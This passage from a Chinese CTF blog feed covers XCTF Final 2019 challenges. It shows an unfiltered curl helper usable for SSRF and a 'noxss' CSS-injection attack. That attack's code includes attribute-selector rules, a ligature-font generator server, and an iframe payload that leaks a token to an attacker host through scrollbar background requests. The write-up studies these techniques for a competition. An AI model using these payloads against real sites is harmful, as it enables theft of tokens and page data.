class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($res[<span class="string">'errcode'</span>]) &amp;&amp; $res[<span class="string">'errcode'</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(error_msg($res));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($res[<span class="string">'return_code'</span>]) &amp;&amp; $res[<span class="string">'return_code'</span>] == <span class="string">'FAIL'</span> &amp;&amp; <span class="keyword">isset</span>($res[<span class="string">'return_msg'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error($res[<span class="string">'return_msg'</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($res[<span class="string">'result_code'</span>]) &amp;&amp; $res[<span class="string">'result_code'</span>] == <span class="string">'FAIL'</span> &amp;&amp; <span class="keyword">isset</span>($res[<span class="string">'err_code'</span>]) &amp;&amp; <span class="keyword">isset</span>($res[<span class="string">'err_code_des'</span>])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error($res[<span class="string">'err_code'</span>] . <span class="string">': '</span> . $res[<span class="string">'err_code_des'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进common.php中post_data函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post_data</span><span class="params">($url, $param = [], $type = <span class="string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $has_json = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'json'</span> &amp;&amp; is_array($param)) &#123;</span><br><span class="line">        $has_json = <span class="keyword">true</span>;</span><br><span class="line">        $param = json_encode($param, JSON_UNESCAPED_UNICODE);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span> &amp;&amp; is_array($param)) &#123;</span><br><span class="line">        $param = ToXml($param);</span><br><span class="line">    &#125;</span><br><span class="line">    add_debug_log($url, <span class="string">'post_data'</span>);</span><br><span class="line"><span class="comment">// 初始化curl</span></span><br><span class="line">$ch = curl_init();</span><br><span class="line"><span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">    add_debug_log($param, <span class="string">'post_data'</span>);</span><br><span class="line">    <span class="comment">// 设置超时</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 设置超时</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置header</span></span><br><span class="line"><span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">    $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">    $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// dump($param);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line"><span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($useCert[<span class="string">'certPath'</span>]) &amp;&amp; <span class="keyword">isset</span>($useCert[<span class="string">'keyPath'</span>])) &#123;</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSLCERTTYPE, <span class="string">'PEM'</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSLCERT, $useCert[<span class="string">'certPath'</span>]);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSLKEYTYPE, <span class="string">'PEM'</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSLKEY, $useCert[<span class="string">'keyPath'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$res = curl_exec($ch);</span><br><span class="line"><span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">    add_debug_log($res, <span class="string">'post_data'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo $res;die;</span></span><br><span class="line">$flat = curl_errno($ch);</span><br><span class="line"></span><br><span class="line">$msg = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($flat) &#123;</span><br><span class="line">    $msg = curl_error($ch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// add_request_log($url, $param, $res, $flat, $msg);</span></span><br><span class="line"><span class="keyword">if</span> ($flat) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'curl_erron'</span> =&gt; $flat,</span><br><span class="line">        <span class="string">'curl_error'</span> =&gt; $msg</span><br><span class="line">    ];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($return_array &amp;&amp; !<span class="keyword">empty</span>($res)) &#123;</span><br><span class="line">        $res = $type == <span class="string">'json'</span> ? json_decode($res, <span class="keyword">true</span>) : FromXml($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数里的curl功能并没有什么过滤，设置type为file，即可通过ssrf拿flag.</p><h3 id="noxss"><a href="#noxss" class="headerlink" title="noxss"></a>noxss</h3><p>这种攻击手法真的tql</p><p>之前也有看过css注入，不过是直接注入属性的值的，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$token1 = md5($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">$token2 = md5($token1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;&lt;meta charset=utf<span class="number">-8</span>&gt;</span><br><span class="line">&lt;input type=hidden value=<span class="meta">&lt;?</span>=$token1 <span class="meta">?&gt;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> TOKEN = <span class="string">"&lt;?=$token2 ?&gt;"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="meta">&lt;?</span>=preg_replace(<span class="string">'#&lt;/style#i'</span>, <span class="string">'#'</span>, $_GET[<span class="string">'css'</span>]) <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>我们可以通过css注入出属性的值，也就是value的值</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"0"</span>]</span> &#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"1"</span>]</span> &#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"2"</span>]</span> &#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"e"</span>]</span> &#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"f"</span>]</span> &#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(http://serwer-napastnika/f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这种方式即可注入出input中value属性的值</p><p>那么这道题需要注入出的值是下面的token的值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> TOKEN = <span class="string">"&lt;?=$token2 ?&gt;"</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>核心思路为通过自定义一种字体，这个字体设置一段字体为连字，script使用这个字体，如果 script出现了这段连字，则由于连字的宽度原因产生滚动条，进而带着爆破出的连字访问我们的服务器</p><p>ROIS wp 中的核心思路如下</p><p><a href="https://imgchr.com/i/MRSPij" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2019/11/19/MRSPij.md.png" alt="MRSPij.md.png"></a></p><p>index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="comment">// Serwer ExprssJS domyślnie dodaje nagłówek ETag,</span></span><br><span class="line"><span class="comment">// ale nam nie jest to potrzebne, więc wyłączamy.</span></span><br><span class="line">app.disable(<span class="string">'etag'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">23460</span>;</span><br><span class="line"><span class="keyword">const</span> js2xmlparser = <span class="built_in">require</span>(<span class="string">'js2xmlparser'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> tmp = <span class="built_in">require</span>(<span class="string">'tmp'</span>);</span><br><span class="line"><span class="keyword">const</span> rimraf = <span class="built_in">require</span>(<span class="string">'rimraf'</span>);</span><br><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Generujemy fonta dla zadanego przedrostka</span></span><br><span class="line"><span class="comment">// i znaków, dla których ma zostać utworzona ligatura.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createFont</span>(<span class="params">prefix, charsToLigature</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> font = &#123;</span><br><span class="line">        <span class="string">"defs"</span>: &#123;</span><br><span class="line">            <span class="string">"font"</span>: &#123;</span><br><span class="line">                <span class="string">"@"</span>: &#123;</span><br><span class="line">                    <span class="string">"id"</span>: <span class="string">"hack"</span>,</span><br><span class="line">                    <span class="string">"horiz-adv-x"</span>: <span class="string">"0"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"font-face"</span>: &#123;</span><br><span class="line">                    <span class="string">"@"</span>: &#123;</span><br><span class="line">                        <span class="string">"font-family"</span>: <span class="string">"hack"</span>,</span><br><span class="line">                        <span class="string">"units-per-em"</span>: <span class="string">"1000"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">"glyph"</span>: []</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Domyślnie wszystkie możliwe znaki mają zerową szerokość...</span></span><br><span class="line">    <span class="keyword">let</span> glyphs = font.defs.font.glyph;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> c = <span class="number">0x20</span>; c &lt;= <span class="number">0x7e</span>; c += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> glyph = &#123;</span><br><span class="line">            <span class="string">"@"</span>: &#123;</span><br><span class="line">                <span class="string">"unicode"</span>: <span class="built_in">String</span>.fromCharCode(c),</span><br><span class="line">                <span class="string">"horiz-adv-x"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="string">"d"</span>: <span class="string">"M1 0z"</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        glyphs.push(glyph);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(prefix + (charsToLigature).toString())</span><br><span class="line">    <span class="comment">// ... za wyjątkiem ligatur, które są BARDZO szerokie.</span></span><br><span class="line">    charsToLigature.forEach(<span class="function"><span class="params">c</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> glyph = &#123;</span><br><span class="line">            <span class="string">"@"</span>: &#123;</span><br><span class="line">                <span class="string">"unicode"</span>: prefix + c,</span><br><span class="line">                 <span class="string">"vert-adv-y"</span>: <span class="string">"10000"</span>,</span><br><span class="line">                 <span class="string">"horiz-adv-x"</span>: <span class="string">"10000"</span>,</span><br><span class="line">                 <span class="string">"d"</span>: <span class="string">"M0 10000,v 0 10000z"</span>,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        glyphs.push(glyph);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Konwertujemy JSON-a na SVG.</span></span><br><span class="line">    <span class="keyword">const</span> xml = js2xmlparser.parse(<span class="string">"svg"</span>, font);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A następnie wykorzystujemy fontforge</span></span><br><span class="line">    <span class="comment">// do zamiany SVG na WOFF.</span></span><br><span class="line">    <span class="keyword">const</span> tmpobj = tmp.dirSync();</span><br><span class="line">    fs.writeFileSync(<span class="string">`<span class="subst">$&#123;tmpobj.name&#125;</span>/font.svg`</span>, xml);</span><br><span class="line">    child_process.spawnSync(<span class="string">"/usr/bin/fontforge"</span>, [</span><br><span class="line">        <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/script.fontforge`</span>,</span><br><span class="line">        <span class="string">`<span class="subst">$&#123;tmpobj.name&#125;</span>/font.svg`</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> woff = fs.readFileSync(<span class="string">`<span class="subst">$&#123;tmpobj.name&#125;</span>/font.woff`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Usuwamy katalog tymczasowy.</span></span><br><span class="line">    rimraf.sync(tmpobj.name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// I zwracamy fonta w postaci WOFF.</span></span><br><span class="line">    <span class="keyword">return</span> woff;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Endpoint do generowania fontów.</span></span><br><span class="line">app.get(<span class="string">"/font/:prefix/:charsToLigature"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; prefix, charsToLigature &#125; = req.params;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Dbamy o to by font znalazł się w cache'u.</span></span><br><span class="line">    res.set(&#123;</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'public, max-age=600'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/font-woff'</span>,</span><br><span class="line">        <span class="string">'Access-Control-Allow-Origin'</span>: <span class="string">'*'</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    res.send(createFont(prefix, <span class="built_in">Array</span>.from(charsToLigature)));</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Listening on <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="comment">//const chars = ['t','f']</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;_'</span>.split(<span class="string">''</span>)</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> ff = [], data = <span class="string">''</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> prefix = <span class="string">'xctf&#123;dobra_robota_jestes_mistrzem_CSS&#125;'</span></span></span><br><span class="line"><span class="javascript">chars.forEach(<span class="function"><span class="params">c</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> css = <span class="string">''</span></span></span><br><span class="line"><span class="actionscript">    css = <span class="string">'?theme=../../../../\fa&#123;&#125;)&#123;&#125;'</span></span></span><br><span class="line"><span class="javascript">    css += <span class="string">`body&#123;overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block&#125;html&#123;display:block&#125;*&#123;display:none&#125;body::-webkit-scrollbar&#123;display:block;background: blue url(http://xxxx:23459/?<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(prefix+c)&#125;</span>)&#125;`</span></span></span><br><span class="line"><span class="javascript">    css += <span class="string">`@font-face&#123;font-family:a<span class="subst">$&#123;c.charCodeAt()&#125;</span>;src:url(http://xxxxx:23460/font/<span class="subst">$&#123;prefix&#125;</span>/<span class="subst">$&#123;c&#125;</span>);&#125;`</span></span></span><br><span class="line"><span class="javascript">    css += <span class="string">`script&#123;font-family:a<span class="subst">$&#123;c.charCodeAt()&#125;</span>;display:block&#125;`</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    document.write('<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">scrolling</span>=<span class="string">yes</span> <span class="attr">samesite</span> <span class="attr">src</span>=<span class="string">"http://noxss.cal1.cn:60080/account/userinfo?theme=' + encodeURIComponent(css) + '"</span> <span class="attr">style</span>=<span class="string">"width:1000000px"</span> <span class="attr">onload</span>=<span class="string">"event.target.style.width=\'100px\'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>')</span></span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/通过css注入窃取html中的数据/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a></p><p><a href="https://xz.aliyun.com/t/6655#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6655#toc-5</a></p><p><a href="https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/11/14/XCTF-Final-2019/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;前段时间又看到ROIS发的final wp,思路真的tql，然而我连联合战队都没有，也没法接触到final，xmsl（好好学习吧&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
</feed>
